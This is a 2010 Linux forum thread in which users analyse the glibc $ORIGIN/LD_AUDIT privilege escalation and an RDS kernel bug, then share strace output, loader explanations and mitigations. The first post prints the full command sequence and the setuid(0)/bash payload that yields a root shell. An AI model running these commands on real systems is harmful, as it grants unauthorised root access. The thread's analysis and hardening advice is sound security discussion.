All you have to do in Fedora 13 is enter the following lines in a shell as normal user:<br>
cd /tmp<br>
mkdir /tmp/exploit<br>
ln /bin/ping /tmp/exploit/target<br>
exec 3&lt; /tmp/exploit/target<br>
rm -rf /tmp/exploit/<br>
echo 'void __attribute__((constructor)) init(){setuid(0);system("/bin/bash");}' &gt; payload.c<br>
gcc -w -fPIC -shared -o /tmp/exploit payload.c<br>
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3<br>
<br>
...and you are now root without entering the root password.<br>
<br>
I don't think this can be considered solely an "upstream" problem, 
because I first tried it in Arch using the same version of glibc, and 
the final command causes both gnome-terminal and xterm windows to 
disappear. Scary.</div></div><hr>

What's interesting to me is that while it works in Fedora, when you try

<br>
And ALWAYS mount user writeable filesystems nosetuid,nosetgid.<br>
<br>
What about capabilities ?    Security by unusability isn't a good idea.<br>
Actually I don't  understand why removing read permissions from all setuids isn't a solution.<br>
<br>
Like this ...<br>
[stevea@luchs Desktop]$ ls -l /bin/ping<br>
-rwsr-xr-x 1 root root 42136 Aug  5 04:19 /bin/ping<br>
[stevea@luchs Desktop]$ sudo chmod -r /bin/ping<br>
[stevea@luchs Desktop]$ ls -l /bin/ping<br>
--ws--x--x 1 root root 42136 Aug  5 04:19 /bin/ping<br>
<br>
Then the exploit does this ....<br>
[stevea@luchs Desktop]$ cd /tmp<br>
[stevea@luchs tmp]$ mkdir /tmp/exploit<br>
[stevea@luchs tmp]$ ln /bin/ping /tmp/exploit/target<br>
[stevea@luchs tmp]$ exec 3&lt; /tmp/exploit/target<br>
bash: /tmp/exploit/target: Permission denied<br>
<br>
If you can't open the setuid prog for either read or write, then you can only exec it.<br>
Of course then you can't use 'file', 'size' or 'ldd' in the binary - modest cost.<br>
<br>
Of course fixing the system setuid progs is the big issue, but we have 
two other issues.   A user creating any readable setuid prog is 
effectively giving every person who can read it permission to execute 
anything in their name.  So the nosetuid stuff is still required.   The 
other issue is that a setuid prog with ACL readability confers the same 
exploit feature.<br>
--<br>
<br>
The other heartburn I have from the first exploit - how can this possibly be a glibc error ?<br>
If so then why can't I just create a 'bad' glibc and use that by 
manipulating LD_LIBRARY and create an exploit ?  Perhaps I 
misunderstand.<br>
<br>
====<br>
<br>
The second exploit is more spectacular.   You do a  recvfrom(sock, 
address, ...); and the incoming data overwrites any address including 
kernel addresses.    That's incredible and the only stop-gap measure I 
can think of is to disallow reading sockets.  Even the worst 
storm-trooping sysadmin wouldn't suggest that I hope.</div></div><hr>

The exec system call uses the privileged program loader - which is part<br>

 - that is b/c you can't create a hard link across mountpoints.  Also 
soft links won't work with this exploit  (unless you have permission to

<br>
So it seems that it's sufficient top prevent all users from writing to

no directory on "/" root is user writable and use separate /home and

<br>
Not a satisfying answer.   I've studied the shared lib mechanism on the 
OSes I work on, but not Linux (not in detail), so seems odd behavior to 
me. We have the same dlclose(), dlerror(), dlopen(), and dlsym() POSIX 
interface, but the implementation is distinct.<br>
<br>
The immediate reason why my suggestion fails is that the library ignores
 the LD_LIBRARY_PATH if the prog is setuid.   That's a pretty weak fence
 I think. <br>
<br>
So the example exploit opens a setuid prog as input to fd3 , deletes the
 setuid prog, then sets the fd3 input from the little shared library 
with ".. init() { setuid(0); system("/bin/bash"); }".   I agree the 
exploit is dependent on the $ORIGIN to cause the glibc to execute the 
exploit library init with privilege - but why would any of that exec 
ever have privilege once the ping link is deleted ?    Obviously the 
privilege is retained from the deleted link to ping opened as input to 
fd3, which makes little sense to me.<br>
<br>
Anyway the point is that glibc is nothing but another userspace library.
  If it can decide (incorrectly)  which  libs are init'ed with 
privilege, then I can write a blackhat-glibc to do so regardless of the 
fix in the official glibc.  That leaves /etc/ld.so* as a honeypot for 
exploits.  I read of ppl adding /usr/local/lib to the standard paths all
 the time ... very bad idea.<br>
<br>
The idea that the library code is deciding based on paths and variables 
like $ORIGIN gives only a slim hope for any sort of security.<br>
<br>
==<br>
<br>
The second exploit is more astonishing !   Why are kernel code maps even
 writable ?   I'd rather see a privileged exception &amp; crash.</div></div><hr>


<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">21st October 2010, 09:37 PM</div></div><div class="posttext">Because the ping link is still open, that means it isn't deleted until<br>

You can't manipulate the original binary (and this manipulation shouldn't<br>
work either) because the reference to ld-linux.so is embedded in the<br>

<br>
Yes, of course, but<br>
1/ the binary for ping is never executed in this case  If you strace it 
you'll see that pings shared libs aren't loaded instead /tmp/exploit's 
are.  I suppose it's possible that the init is called as soon as that 
libraries dependencies are loaded ... seems odd.<br>
2/ the /tmp/exploit is never referenced but it IS executed due to the 
$ORIGIN tag, which I don't completely understand.   How exactly does 
that resolve make sense ?<br>
<br>
<br>
[pid 15774] execve("/proc/self/fd/3", ["/proc/self/fd/3"], [/* 94 vars */]) = 0<br>
... (nothing special here)<br>
[pid 15774] readlink("/proc/self/exe", "/tmp/exploit/target (deleted)", 4096) = 29<br>
[pid 15774] open("/tmp/exploit", O_RDONLY) = 4<br>
[pid 15774] read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\22 0\3\0\0004\0\0\0"..., 512) = 512<br>
... loaded<br>
... more libs loaded but not libidn ???? .... it is searching exploit's refs.<br>
<br>
.... the ping's libidn.so is never loaded, but /tmp/exploit's init is called ?<br>
<br>
So the readlink produces a useless string "/tmp/exploit/target 
(deleted)", then then the strange bit, related somehow to the $ORIGIN 
setting,  is that the nascent process backs up the path to 
"/tmp/exploit" and execs that !!!<br>
<br>
And it isn't the library code directly - it is linked into /lib/ld-linux.so, an<br>
executable - not a library, used by the exec system call to link together<br>
every program you try to exec.<br>
<br>
Its primary purpose is to read ELF binaries (and shared libraries) to<br>
resolve symbols at runtime. As an executable, it inherits the privileges<br>
of the base binary that is being executed (as in setuid).<br>
<br>
Thanks - that implementation had sipped my mind. <br>
<br>
What I don't know is whether the actual starting address of executables<br>
is in this file or in the base executable where the "main" function is.<br>
<br>
The .interp section of a dynamically linked executable refers to ld-linux.so and the <br>
.dynstr section contains the shared lib names and the referenced symbols names,<br>
so ld-linux executes before the app executable.</div></div><hr>

not quite the same.</div></div><hr>

<br>
Yeah - I get that, but ... hmm So $ORIGIN refers the the working 
directory of the hard link "/tmp/exploit" which we delete and replace 
with a naughty shared object.   Ping really does start, but as we've 
given it a LD_AUDIT=$ORIGIN that lib loads and inits first and ... bam. <br>
<br>
This exploit doesn't work if you add a suffix to origin like 
$ORIGIN/../foo.so ,  so the only exploit seems to be  to replace the 
directory containing the setuid prog.<br>
<br>
 Personally, I don't thing exec should accept the use of a fd for an 
executable. I get your meaning, and in he old days before /proc you 
couldn't.  What is happening here is that exec gets a string which it 
tries to interpret in userspace as a path.   That path "/proc/self/fd/3"
 is just a soft link  (to "/tmp/exploit/target"), so readlink is called 
(by ld-linux.so ???) to translate it and it returns the result string 
... "   "/tmp/exploit/target (deleted)" as shown in the strace, which I 
think could have been the end of the story.  <br>
<br>
But yes, maybe the problem is that command line manipulation about 
loading libraries MUST be ignored for setuid progs.   A setuid prog will
 already ignore and LD_LIBRARY_PATH revisions, so why would it accept an
 external LD_AUDIT  ?</div></div><hr>


<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">22nd October 2010, 05:10 PM</div></div><div class="posttext">You are right - I missed the exec was not actually executing a fd (exec is a<br>
no-op in this, only the redirection takes place)<br>
<br>
And the loader really really must ignore the users environment with<br>
setuid programs.<br>
<br>
To me, this would appear to be the bug. And disabling the users environment<br>
is tricky too - as the contents of that environment are/can<br>
be used by the program (ie- "su" vs "su -"). So the environment has to<br>
be passed, and the loader has to properly ignore it for setuid programs.<br>
<br>
Completely.<br>
<br>
A long time ago, it happened with the LD_LIBRARY_PATH...</div></div><hr>

Anyway we may both be wrong in our detailed understanding, but the 
genius of open source is that there are a thousand folks like us, some 
with a lot more time and interest,  looking over the shoulders of the 
implementers.  Obviously this exploit was discovered by someone like 
that, with access to source and not a hacker for good reasons.<br>

 for anyone interested kernel-2.6.34.7-62.fc13 has the fix for 
depessimize-rds_copy_page_user.patch: Fix CVE-2010-3904, local privilege
 escalation via RDS protocol and is available from koji as of Fri Oct 22
 2010 16:22:05 UTC. I am running it but not long enough to vouch for 
it's stability. :)<br>
<br>
Thanks Kyle</div></div><hr>

<br>
There is a simple modprobe config to prevent it.<br>

<br>
I'll suggest this is a good idea for anyone running F13 or earlier w/ a 2.6.30 or later kernel.<br>

The ping/setuid program issue can be evaded by making all setuid programs non-readable except by other.<br>
<br>
To examine the setuid progs as root  ..<br>
find / -xdev \( -perm -4000 \) -type f | xargs ls -l<br>
To make then unreadable by other ....<br>
find / -xdev \( -perm -4000 \) -type f | xargs chmod o-r<br>
<br>
You may want to make the few that have non-root group ownership non-readable by group too.  Fore example:<br>
<br>
-rwsr-x---. 1 backuppc apache    3993 May 17 14:12 /usr/share/BackupPC/sbin/BackupPC_Admin<br>
needs a "chmod g-r  /usr/share/BackupPC/sbin/BackupPC_Admin"</div></div><hr>

Though interestingly... if you run it as root it fails :p (I'd forgot I'd su'd to root earlier...)<br>
<br>
Luckily the one system I have that potentially can be used by other people doesn't have a compiler... :)</div></div><hr>
